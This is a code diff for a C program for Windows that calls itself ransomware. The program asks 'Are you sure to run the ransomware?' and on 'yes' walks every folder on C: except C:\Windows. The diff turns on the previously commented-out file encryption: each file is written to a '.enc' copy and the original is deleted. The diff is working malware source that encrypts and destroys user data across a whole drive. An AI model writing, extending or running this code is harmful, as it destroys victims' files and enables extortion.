@@ -7,10 +7,18 @@
 
 char* convertWCharToChar(wchar_t* wcharToConvert);
 
+#define INVALID_FOLDER 0x16
+
 int main() {
-	setLocaleUTF8ToAvoidChineseCharErrors();
-	//iterateFolder("C:\\Users\\Deyvisson Breno\\Desktop\\Teste");
-	iterateFolder("D:");
+	char userInput[256];
+	printf("Are you sure to run the ransomware?");
+	scanf("%s", userInput);
+
+	if (strcmp(userInput, "yes") == 0) {
+		setLocaleUTF8ToAvoidChineseCharErrors();
+		iterateFolder("C:");
+	}
+	scanf("%s", userInput);
 }
 
 setLocaleUTF8ToAvoidChineseCharErrors() {
@@ -34,6 +42,12 @@ createFile(char path[]) {
 
 iterateFolder(char initialPath[]) {
 
+	
+	if (strstr(initialPath, "C:\\Windows") != NULL) {
+		printf("Skipping windows folder");
+		return;
+	}
+
 	char path[260];
 
 	strcpy(path, initialPath);
@@ -45,16 +59,16 @@ iterateFolder(char initialPath[]) {
 	hFind = FindFirstFileA(path, &fdata);
 
 	if (hFind == INVALID_HANDLE_VALUE) {
-		printf("Path not found: %d", GetLastError());
+		printf("Path not found or invalid: %d", GetLastError());
 		return;
 	}
+
 	do {
-		if (hFind == INVALID_HANDLE_VALUE) {
+		if (hFind == INVALID_HANDLE_VALUE || fdata.dwFileAttributes == INVALID_FOLDER) {
 			continue;
 		}
 		if (strcmp(fdata.cFileName, ".") != 0 && strcmp(fdata.cFileName, "..") != 0 ) {
-			if (fdata.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
-				wprintf(L"folder: %s\r\n", fdata.cFileName);
+			if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 
 				char subFolder[260];
 				strcpy(subFolder, initialPath);
@@ -64,22 +78,18 @@ iterateFolder(char initialPath[]) {
 				iterateFolder(subFolder);
 
 			}
-			else if (fdata.dwFileAttributes == FILE_ATTRIBUTE_ARCHIVE) {
-				wprintf(L"file: %s\r\n", fdata.cFileName);
+			else {
 				char fullFilePath[2048];
 				char* convertedFileName = convertWCharToChar(fdata.cFileName);
 				strcpy(fullFilePath, initialPath);
 				strcat(fullFilePath, "\\");
 				strcat(fullFilePath, convertedFileName);
-				printf(fullFilePath);
 				char encryptedFilePath[2048];
 				strcpy(encryptedFilePath, fullFilePath);
 				strcat(encryptedFilePath, ".enc");
-				printf(encryptedFilePath);
-				//encryptFile(fullFilePath, encryptedFilePath);
-			}
-			else {
-				printf("Not supported file, skipping");
+				printf("%s\r\n", fullFilePath);
+				encryptFile(fullFilePath, encryptedFilePath);
+				remove(fullFilePath);
 			}
 		}
 	} while (FindNextFile(hFind, &fdata));
@@ -92,7 +102,7 @@ encryptFile(char sourceFilePath[], char destitationFilePath[]) {
 
 	if (!sourceFile || !destinationFile) {
 		printf("An error has occured while opening source/destination files");
-		exit(1);
+		return;
 	}
 
 	int c;	
@@ -112,7 +122,7 @@ decryptFile(char sourceFilePath[], char destitationFilePath[]) {
 
 	if (!sourceFile || !destinationFile) {
 		printf("An error has occured while opening source/destination files");
-		exit(1);
+		return;
 	}
 
 	int c;
